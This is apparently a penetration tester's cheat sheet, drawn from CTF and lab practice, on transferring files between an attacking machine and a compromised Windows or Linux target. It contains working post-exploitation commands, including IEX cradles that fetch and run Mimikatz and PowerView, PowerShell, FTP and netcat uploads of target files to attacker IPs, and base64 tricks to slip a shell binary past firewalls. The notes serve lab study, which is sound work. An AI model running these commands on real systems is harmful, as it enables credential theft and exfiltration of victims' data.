# Transfert file between target and attacking machines

> *These notes are from my practice at work, during CTF and from HTB Academy*

## Verify file integrity

- `file shell`
- `md5sum shell` and compare the result in the attacking machine and target
- `Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash` in powershell

## Method with no communications required

### Encode the file in base64

> Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

#### From Attack to target

- Get the md5sum of the file (see command above)
- Encode a file in bash `cat id_rsa |base64 -w 0;echo`
- Decode it in powershell `PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRU[STRIPPED]0tLQo="))`
- Decode it in bash (if the target is a linux machine) `echo -n 'LS0tLS1CRUdJTiBP[STREIPPED]FURSBLRVktLS0tLQo=' | base64 -d > id_rsa`
- Verify the integrity of the file with Get-FileHash on powershell (see command above)

#### From target to attack

- Get the md5sum of the file (see command above)
- Encode a file in Powershell `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`
- `echo IyBDb3B5cml[STRIPPED]b3N0DQo= | base64 -d > hosts` Decode Base64 String in Linux
- Verify the integrity of the file with Get-FileHash on powershell (see command above)

### PowerShell Web Downloads

|Method|Description|
|------|-----------|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a Stream.|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

#### PowerShell DownloadString - Fileless Method

- `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
- `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`

#### PowerShell Invoke-WebRequest

> Slower

- `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1` You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.

- [Powershell Download cradle by HarmJ0y](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
- `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX` Use `-UseBasicParsing` in case first launch config has not been completed in Internet Explorer.
- `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` Bypass error SSL/TLS error.

### PowerShell Web Uploads

> PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

#### Installing a Configured WebServer with Upload

##### On your attack machine

- `pip3 install uploadserver`
- `python3 -m uploadserver`

##### In your target

- Powershell [script](https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1) to upload a file to Python Upload Server

```ps
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

- Powershell Base64 Web Upload

```ps
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

##### On your attack machine

- `nc -lvnp 8000` We catch the base64 data with Netcat
- `echo <base64> | base64 -d -w 0 > hosts` We use the base64 application with the decode option to convert the string to the file

## HTTP

### From attack machine to Target

#### Attacking machine

- In kali we can use python `python3 -m http.server 80`

#### Target machine

- On a win target machine you can access it directly with the browser: `http://IP-ATTACKING-MACHINE/FILE-TO-GET` or you can use certutil.exe `certutil.exe -urlcache http://IP-ATTACKING-MACHINE/FILE-TO-GET file-to-get`
- In a linux target machine you can use `wget http://IP-ATTACKING-MACHINE/FILE-TO-GET` or curl `curl -o FILE-TO-GET http://IP-ATTACKING-MACHINE/FILE-TO-GET`

#### Updog

- Another great tool to transfer is [updog](https://github.com/sc0tfree/updog), it goes both ways if you can access a browser :D :D :D
- `pip3 install updog` easy as this to install

## FTP

### From attack machine to target

#### Attacking machine

- `sudo pip3 install pyftpdlib`
- `python3 -m pyftpdlib -p 21 --write`

#### Target machine

- `ftp IP-OF-ATTACKING-MACHINE` we can then use `get filename` to get the file
- `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')` with powershell
- Create a Command File for the FTP Client and Download the Target File

```dos
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### From Target to attack

#### Attacking machine

- `python3 -m pyftpdlib -p 21 --write`

#### Target machine

- `ftp IP-OF-ATTACKING-MACHINE` we can then use `put filename` to send the file
- `curl --user anonymous:anonymous -o docker-toolbox.exe ftp://10.10.10.236/docker-toolbox.exe`
- `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')` with powershell
- Create a Command File for the FTP Client to Upload a File

```dos
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## SMB

### Both ways

#### Attacking machine

- In kali we can use Impacket `python3 smbserver.py -smb2support sharename /path/folder` or `sudo impacket-smbserver share -smb2support /tmp/smbshare`
- We can specify `-username user -password pass` if we need set up an authentication

#### Target machine

- In a win victim machine we just need to copy the file to the attacking machine: `copy  FiletoDownload \\IP-OF-ATTACKING-MACHINE\SHARENAME` 
- If we want to get a file to our target from the attacking machine we just need to `copy \\192.168.220.133\share\nc.exe`
- Sometimes on windows we will be asked to use a service that requires authentication so we can set this up with `net use \\<network-location>\<some-share> password /USER:username` after this we will be able to use the previous copy command

### run SMB over HTTP with WebDav

> If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

To set up our WebDav server, we need to install two Python modules, wsgidav and cheroot  

- `sudo pip install wsgidav cheroot`
- `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous` Using the WebDav Python module

- Connect to the Webdav share

- `dir \\192.168.49.128\DavWWWRoot` Now we can attempt to connect to the share using the DavWWWRoot directory

> Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
> You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

- Upload file using smb

```dos
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

## Metasploit

### From attack machine to Target

There is an upload and download feature

## SSH (creds needed)

### From attack machine to Target (local to remote)

- In your kali or any linux `scp FILE-TO-SEND user@ip:/path/to/folder`

### From target to attack (remote to local)

- In your kali or any linux cmd `scp user@ip:/path/to/folder FILE-TO-GET`

### Note

- If you get this error `protocol error: filename does not match request`
- You will need to add `-T` in your command. Here is an example:
- `scp -T user@server:C:\\Path\\To\\file.txt dest-folder`

## Netcat

### From Target to attack machine

#### Target machine

- `nc -lvp PORT-NUMBER > FILE-TO-SEND

#### Attacking machine

- `nc VICTIM-IP PORT-NUMBER -w 3 < FILE` note: -w is for the time out in seconds

## Evade firewall

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:  

- `base64 shell -w 0`

Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:  

- `echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ..lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`

## Resources

{% embed url="https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/" %} Transfer files (Post explotation) – CheatSheet - PABLO PLAZA MARTÍNEZ {% endembed %}
